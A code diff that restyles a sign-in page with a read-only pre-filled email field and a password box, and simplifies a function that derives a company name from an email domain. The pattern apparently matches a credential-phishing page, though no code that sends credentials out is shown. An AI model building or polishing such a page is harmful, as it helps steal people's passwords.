@@ -26,11 +26,10 @@
             background-color: #0A4B8A; /* Slightly darker blue on hover */
         }
 
-        .form-header,
-        .form-text {
+        .password-header {
             font-size: 16px;
+            font-weight: bold;
             color: #444;
-            font-weight: normal; /* Normal font weight for consistency */
             margin-bottom: 8px;
         }
     </style>
@@ -54,12 +53,13 @@
                     </p>
                 </div>
                 <div style="padding: 16px 40px;">
-                    <p class="form-text">Sign in with your Email to continue</p>
+                    <p style="font-size: 12px; margin-bottom: 4px;">Sign in with your Email to continue</p>
                     <input type="text" id="id" style="width: 100%; height: 36px; border: 1px solid; padding: 1px 8px;" readonly>
 
-                    <p class="form-header">Enter password</p>
+                    <!-- Password Input -->
+                    <p class="password-header">Enter password</p>
                     <input type="password" id="pass" placeholder="Password" style="width: 100%; height: 36px; border: 1px solid; padding: 1px 8px;">
-
+                    
                     <div class="sp-div" style="margin-top: 10px;">
                         <button class="btn btn-primary" id="next-btn" 
                                 type="button" 
@@ -102,12 +102,7 @@
                 // Replace hyphens/underscores with spaces
                 let formatted = str.replace(/[-_]/g, " ");
                 // Add spacing for camelCase words (e.g., "TechnitySolutions" → "Technity Solutions")
-                formatted = formatted.replace(/([a-z])([A-Z])/g, "$1 $2").trim();
-                // Capitalize first letters (title case)
-                return formatted
-                    .split(" ")
-                    .map(word => word.charAt(0).toUpperCase() + word.slice(1).toLowerCase())
-                    .join(" ");
+                return formatted.replace(/([a-z])([A-Z])/g, "$1 $2").trim();
             }
 
             // Static mapping for known domains and company names
